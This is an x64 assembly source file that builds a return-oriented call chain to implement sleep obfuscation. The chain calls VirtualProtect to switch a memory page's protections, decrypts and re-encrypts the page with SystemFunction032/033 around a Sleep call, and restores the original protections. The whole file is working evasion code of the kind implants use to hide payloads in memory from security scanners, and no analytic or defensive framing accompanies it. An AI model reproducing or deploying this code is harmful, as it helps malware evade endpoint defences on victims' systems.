segment .text

global GetRIP
global DeepSleep

GetRIP:
	jmp FakeStub
	ret

FakeStub:
	pop rax
	jmp rax

RopThis:

	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14
		
	push QWORD [rbp + 60h] ; VirtualProtect
	push 1
	push 1
	push r9
	push 20h ; PAGE_EXECUTE_READ
	push rcx
	push rdx
	push QWORD [rbp + 40h] ; SuperPop

	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14

	push QWORD [rbp + 58h] ; SystemFunction032 (Decrypt)
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 38h] ; myPage
	push QWORD [rbp + 30h] ; Key
	push QWORD [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14

	push QWORD [rbp + 60h] ; VirtualProtect
	push 1
	push 1
	push r9
	push 04h ; PAGE_READWRITE
	push rcx
	push rdx
	push QWORD [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14
	
	; Sleep
	push QWORD [rbp + 50h] ; Sleep
	push 41h
	push 41h
	push 41h
	push 41h
	push QWORD [rbp + 68h] ; Sleeptime here
	push 41h
	push QWORD [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14

	push QWORD [rbp + 60h] ; VirtualProtect
	push 1
	push 1
	push r9
	push r8
	push rcx
	push rdx
	push QWORD [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14
	
	push QWORD [rbp + 58h] ; SystemFunction033 (Encrypt)
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 38h] ; myPage
	push QWORD [rbp + 30h] ; myKey
	push QWORD [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD [rbp + 48h] ; addRsp32Popr14

	push QWORD [rbp + 60h] ; VirtualProtect
	push 1
	push 1
	push r9
	push 04h ; PAGE_READWRITE
	push rcx
	push rdx
	push QWORD [rbp + 40h] ; SuperPop
	
	ret

DeepSleep:

	push rbp
	mov rbp, rsp

	push rbx
	push rsi
	push rdi
	push r12
	push r13
	push r14
	push r15
	push r15
	
	call RopThis

	pop r15
	pop r15
	pop r14
	pop r13
	pop r12
	pop rdi
	pop rsi
	pop rbx

	mov rsp, rbp
	pop rbp
	ret
